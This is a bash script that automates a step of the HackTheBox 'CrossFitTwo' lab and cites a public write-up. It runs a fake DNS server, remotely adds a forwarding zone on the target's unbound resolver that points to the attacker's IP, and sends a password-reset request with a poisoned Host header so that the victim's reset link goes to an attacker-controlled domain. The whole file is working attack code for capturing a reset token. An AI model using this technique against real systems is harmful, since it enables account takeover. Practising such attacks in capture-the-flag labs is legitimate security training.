#!/bin/bash

##############################
## https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html
###############################

domain="gymxcrossfit.htb"
sleep=180

echo "[*] Starting DNS server"
/opt/FakeDns/fakedns.py -c ./fakedns.conf &
FAKEDNS=$!
echo "[*] Forwarding zone"
sudo unbound-control -s 10.10.10.232 forward_add +i $domain 10.10.14.13@53
echo "[*] Triggering password reset"
curl -s -X POST -H "Host: ${domain}/employees.crossfit.htb"  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Referer: http://employees.crossfit.htb/password-reset.php' --data-binary 'email=david.palmer%40crossfit.htb' http://employees.crossfit.htb/password-reset.php | grep 'class="alert' | cut -d'>' -f2 | cut -d'<' -f1
echo "[*] Sleeping $sleep seconds waiting for link click"
sleep $sleep
kill $FAKEDNS 


##
#####################
##
